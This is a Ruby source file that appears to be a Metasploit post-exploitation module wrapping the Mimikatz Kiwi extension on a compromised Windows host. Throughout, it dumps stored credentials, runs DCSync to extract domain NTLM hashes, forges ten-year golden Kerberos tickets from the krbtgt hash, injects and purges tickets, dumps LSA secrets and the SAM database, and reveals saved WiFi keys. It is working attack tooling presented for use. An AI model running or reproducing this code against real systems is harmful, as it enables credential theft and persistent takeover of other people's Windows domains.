require 'msf/core'
require 'msf/core/post/windows/netapi'
require 'msf/core/post/windows/kiwi'
require 'msf/core/post/windows/error'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::NetAPI
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Kiwi
  include Msf::Post::Windows::Error

  def initialize(info = {})
    super(update_info(
      info,
      'Name'         => 'Kiwi Command Execution',
      'Description'  => %q{
          This module executes available commands from the Mimikatz Kiwi Extension. The benefit of this
        module is that it better allows users to create scripts that utilize Kiwi without running into
        usage conflicts that arise from multiple users interacting with the same session.
        },
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Nate Caroe <nate.caroe@risksense.com>',
        'OJ Reeves'
      ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
    ))

    register_options(
      [
        OptString.new('CMD', [true, 'Kiwi Command']),
      ], self.class)
  end

  @@golden_ticket_create_opts = Rex::Parser::Arguments.new(
    '-h' => [ false, 'Help banner' ],
    '-u' => [ true,  'Name of the user to create the ticket for (required)' ],
    '-i' => [ true,  'ID of the user to associate the ticket with' ],
    '-g' => [ true,  'Comma-separated list of group identifiers to include (eg: 501,502)' ],
    '-d' => [ true,  'FQDN of the target domain (required)' ],
    '-k' => [ true,  'krbtgt domain user NTLM hash' ],
    '-t' => [ true,  'Local path of the file to store the ticket in (required)' ],
    '-s' => [ true,  'SID of the domain' ]
  )

  @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
    '-h' => [ false, 'Help banner' ],
  )

  @@creds_opts = Rex::Parser::Arguments.new(
    '-o' => [ true,  'Write the output to the specified file.' ],
    '-h' => [ false, 'Help menu.' ]
  )

  def golden_ticket_create_usage
    print_line('Usage: golden_ticket_create [options]')
    print_line
    print_line('Create a golden kerberos ticket that expires in 10 years time.')
    print_line(@@golden_ticket_create_opts.usage)
  end

  def kerberos_ticket_list_usage
    print_line('Usage: kerberos_ticket_list [options]')
    print_line
    print_line('List all the available Kerberos tickets.')
    print_line(@@kerberos_ticket_list_opts.usage)
  end

  def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
    if client.sys.config.is_system?
      print_warning(msg)
      return false
    end

    true
  end

  def cmd_creds_usage(provider)
    print_line("Usage: creds_#{provider} [options]")
    print_line
    print_line("Dump #{provider} credentials.")
    print_line(@@creds_opts.usage)
  end

  def to_hex(value, sep = '')
    Rex::Text.to_hex(value || '', sep).strip
  end

  def display_wifi_profiles(profiles)
    profiles.each do |r|
      header = r[:guid]
      header = "#{r[:desc]} - #{header}" if r[:desc]
      table = Rex::Text::Table.new(
        'Header'    => header,
        'Indent'    => 0,
        'SortIndex' => 0,
        'Columns'   => [
          'Name', 'Auth', 'Type', 'Shared Key'
        ]
      )

      print_line
      r[:profiles].each do |p|
        table << [p[:name], p[:auth], p[:key_type] || 'Unknown', p[:shared_key]]
      end

      print_line(table.to_s)
      print_line("State: #{r[:state] || 'Unknown'}")
    end
  end

  def check_is_system
    if client.sys.config.is_system?
      print_good('Running as SYSTEM')
      return true
    end

    print_warning('Not running as SYSTEM, execution may fail')
    false
  end

  def scrape_passwords(provider, method, args)
    if args.include?('-h')
      cmd_creds_usage(provider)
      return
    end

    return unless check_is_system
    print_status("Retrieving #{provider} credentials")
    accounts = method.call
    output = ""

    accounts.keys.each do |k|

      next if accounts[k].length == 0

      table = Rex::Text::Table.new(
        'Header'    => "#{k} credentials",
        'Indent'    => 0,
        'SortIndex' => 0,
        'Columns'   => accounts[k][0].keys
      )

      accounts[k].each do |acct|
        table << acct.values
      end

      output << table.to_s + "\n"
    end

    print_line(output)

    # determine if a target file path was passed in
    file_index = args.index('-o')
    unless file_index.nil?
      if args.length > file_index + 1
        # try to write the file to disk
        begin
          ::File.write(args[file_index + 1], output)
          print_good("Output written to #{args[file_index + 1]}")
        rescue
          print_error("Unable to write to #{args[file_index + 1]}")
        end
      else
        print_error('Missing file path for -o parameter')
      end
    end

    return true
  end

  def run
    return unless load_kiwi

    cmdstr = datastore['CMD'].split
    cmd = cmdstr[0]
    args = cmdstr.slice(1, cmdstr.size - 1)

    case cmd
    when 'kiwi_cmd'
      output = client.kiwi.exec_cmd(args.join(' '))
      print_line(output)
    when 'dcsync'
      return unless check_is_domain_user

      if args.length != 1
        print_line('Usage: dcsync <DOMAIN\user>')
        print_line
        return
      end
      print_line(client.kiwi.dcsync(args[0])) 
    when 'dcsync_ntlm'
      return unless check_is_domain_user

      if args.length != 1
        print_line('Usage: dcsync_ntlm <DOMAIN\user>')
        print_line
        return
      end

      user = args[0]
      result = client.kiwi.dcsync_ntlm(user)
      if result
        print_good("Account   : #{user}")
        print_good("NTLM Hash : #{result[:ntlm]}")
        print_good("LM Hash   : #{result[:lm]}")
        print_good("SID       : #{result[:sid]}")
        print_good("RID       : #{result[:rid]}")
      else
        print_error("Failed to retrieve information for #{user}")
      end
      print_line
    when 'creds_wdigest'
      method = Proc.new { client.kiwi.creds_wdigest }
      scrape_passwords('wdigest', method, args)
    when 'creds_msv'
      method = Proc.new { client.kiwi.creds_msv }
      scrape_passwords('msv', method, args)
    when 'creds_ssp'
      method = Proc.new { client.kiwi.creds_ssp }
      scrape_passwords('ssp', method, args)
    when 'creds_tspkg'
      method = Proc.new { client.kiwi.creds_tspkg }
      scrape_passwords('tspkg', method, args)
    when 'creds_kerberos'
      method = Proc.new { client.kiwi.creds_kerberos }
      scrape_passwords('kerberos', method, args)
    when 'creds_all'
      method = Proc.new { client.kiwi.creds_all }
      scrape_passwords('all', method, args)
    when 'golden_ticket_create'
      if args.include?("-h")
        golden_ticket_create_usage
        return
      end

      target_file = nil
      opts = {
        user: nil,
        domain_name: nil,
        domain_sid: nil,
        krbtgt_hash: nil,
        user_id: nil,
        group_ids: nil
      }

      @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
        case opt
        when '-u'
          opts[:user] = val
        when '-d'
          opts[:domain_name] = val
        when '-k'
          opts[:krbtgt_hash] = val
        when '-t'
          target_file = val
        when '-i'
          opts[:user_id] = val.to_i
        when '-g'
          opts[:group_ids] = val
        when '-s'
          opts[:domain_sid] = val
        end
      }

      # we need the user and domain at the very least
      unless opts[:user] && opts[:domain_name] && target_file
        golden_ticket_create_usage
        return
      end

      # is anything else missing?
      unless opts[:domain_sid] && opts[:krbtgt_hash]
        return unless check_is_domain_user('Unable to run module as SYSTEM unless krbtgt and domain sid are provided')

        # let's go discover it
        krbtgt_username = opts[:user].split('\\')[0] + '\\krbtgt'
        dcsync_result = client.kiwi.dcsync_ntlm(krbtgt_username)
        unless opts[:krbtgt_hash]
          opts[:krbtgt_hash] = dcsync_result[:ntlm]
          print_warning("NTLM hash for krbtgt missing, using #{opts[:krbtgt_hash]} extracted from #{krbtgt_username}")
        end

        unless opts[:domain_sid]
          domain_sid = dcsync_result[:sid].split('-')
          opts[:domain_sid] = domain_sid[0, domain_sid.length - 1].join('-')
          print_warning("Domain SID missing, using #{opts[:domain_sid]} extracted from SID of #{krbtgt_username}")
        end
      end

      ticket = client.kiwi.golden_ticket_create(opts)

      ::File.open(target_file, 'wb') do |f|
        f.write(ticket)
      end

      print_good("Golden Kerberos ticket written to #{target_file}")
    when 'kerberos_ticket_use'
      if args.length != 1
        print_line('Usage: kerberos_ticket_use ticketpath')
        return
      end

      target = args[0]
      ticket  = ''
      ::File.open(target, 'rb') do |f|
        ticket += f.read(f.stat.size)
      end

      print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes ...")
      if client.kiwi.kerberos_ticket_use(ticket)
        print_good('Kerberos ticket applied successfully.')
      else
        print_error('Kerberos ticket application failed.')
      end
    when 'kerberos_ticket_purge'
      client.kiwi.kerberos_ticket_purge
      print_good('Kerberos tickets purged')
    when 'kerberos_ticket_list'
      if args.include?('-h')
        kerberos_ticket_list_usage
        return
      end

      output = client.kiwi.kerberos_ticket_list.strip
      if output == ''
        print_error('No kerberos tickets exist in the current session.')
      else
        print_good('Kerberos tickets found in the current session.')
        print_line(output)
      end
      print_line
    when 'lsa_dump_secrets'
      return unless check_is_system

      print_status('Dumping LSA secrets')
      print_line(client.kiwi.lsa_dump_secrets)
      print_line
    when 'lsa_dump_sam'
      return unless check_is_system

      print_status('Dumping SAM')
      print_line(client.kiwi.lsa_dump_sam)
      print_line
    when 'wifi_list'
      results = client.kiwi.wifi_list
      if results.length > 0
        display_wifi_profiles(results)
      else
        print_line
        print_error('No wireless profiles found on the target.')
      end

      true
    when 'wifi_list_shared'
      interfaces_dir = '%AllUsersProfile%\Microsoft\Wlansvc\Profiles\Interfaces'
      interfaces_dir = client.fs.file.expand_path(interfaces_dir)
      files = client.fs.file.search(interfaces_dir, '*.xml', true)

      if files.length == 0
        print_error('No shared WiFi profiles found.')
      else
        interfaces = {}
        files.each do |f|
          interface_guid = f['path'].split("\\")[-1]
          full_path = "#{f['path']}\\#{f['name']}"

          interfaces[interface_guid] ||= []
          interfaces[interface_guid] << full_path
        end
        results = client.kiwi.wifi_parse_shared(interfaces)

        if results.length > 0
          display_wifi_profiles(results)
        else
          print_line
          print_error('No shared wireless profiles found on the target.')
        end
      end

      true
    else
      print_error('Invalid command: '+cmd)
  end
  
end
end